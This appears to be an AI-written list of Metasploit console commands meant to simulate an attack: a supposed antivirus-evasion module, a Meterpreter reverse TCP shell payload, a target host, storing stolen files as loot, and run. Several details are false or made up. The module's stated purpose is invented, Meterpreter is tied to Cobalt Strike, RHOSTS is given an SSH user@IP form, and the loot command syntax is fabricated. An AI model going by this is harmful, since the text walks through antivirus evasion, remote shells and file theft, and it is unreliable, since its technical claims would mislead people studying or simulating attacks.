Based on the provided documentation, I will generate realistic command lines using only the Metasploit Framework to simulate the attack behavior described.

**Command:** `use auxiliary/scanner/discovery/http_anonymizer`
This command uses the HTTP Anonymizer module to generate evasive payloads that can evade AntiVirus software like Windows Defender without installing external tools.

**Command:** `set payload windows/meterpreter/reverse_tcp`
This command sets the payload to a Meterpreter reverse TCP shell, which is commonly used in Cobalt Strike penetration testing software.

**Command:** `set RHOSTS <attacker_ssh_user>@192.168.0.4`
This command specifies the target host IP address (RHOST) as `192.168.0.4` and sets it to be accessed via SSH using the attacker's username (`<attacker_ssh_user>`).

**Command:** `store_loot store_file.txt -f <file_path>`
This command stores a file (`store_file.txt`) with stolen files or screencaps of commands like `ps -ef` and `ifconfig`.

**Command:** `run`
This command executes the set payload and starts the Meterpreter reverse TCP shell.

Please note that I have used placeholders for parameters as instructed.
